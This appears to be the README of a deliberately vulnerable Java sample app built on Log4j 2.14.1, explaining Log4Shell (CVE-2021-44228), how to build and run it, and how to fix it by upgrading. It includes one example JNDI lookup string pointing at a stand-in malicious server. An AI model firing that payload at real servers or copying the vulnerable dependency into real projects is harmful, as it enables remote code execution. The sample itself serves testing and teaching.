# Vulnerable Log4j Sample

This is a sample Java application that uses a vulnerable version of Log4j (2.14.1) which is affected by the Log4Shell vulnerability (CVE-2021-44228).

**WARNING**: This project is intentionally vulnerable and should only be used for testing and educational purposes in a controlled environment.

## Vulnerability Details

This application uses Log4j 2.14.1, which is vulnerable to the Log4Shell vulnerability (CVE-2021-44228). This vulnerability allows attackers to execute arbitrary code on the server by sending a specially crafted request that gets logged by Log4j.

The vulnerability is triggered when Log4j processes a log message containing a JNDI lookup, such as `${jndi:ldap://malicious-server/payload}`.

## Project Structure

```
vulnerable-log4j-sample/
├── build.gradle           # Gradle build configuration
├── src/
│   └── main/
│       ├── java/
│       │   └── com/
│       │       └── example/
│       │           └── vulnerable/
│       │               └── VulnerableApp.java  # Main application
│       └── resources/
│           └── log4j2.xml  # Log4j configuration
└── README.md              # This file
```

## Building and Running

To build the project:

```bash
cd vulnerable-log4j-sample
./gradlew build
```

To run the application:

```bash
./gradlew run
```

Or with a custom user input:

```bash
./gradlew run -Duser.input="Custom input"
```

## Security Note

This project is intentionally vulnerable and should only be used for testing and educational purposes in a controlled environment. Do not deploy this application in a production environment or expose it to untrusted networks.

## Fixing the Vulnerability

To fix the vulnerability, update the Log4j dependencies in the `build.gradle` file to version 2.15.0 or later:

```gradle
dependencies {
    implementation 'org.apache.logging.log4j:log4j-api:2.17.1'
    implementation 'org.apache.logging.log4j:log4j-core:2.17.1'
}
```

## References

- [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
- [OWASP Log4Shell Vulnerability Guidance](https://owasp.org/www-community/vulnerabilities/Log4Shell)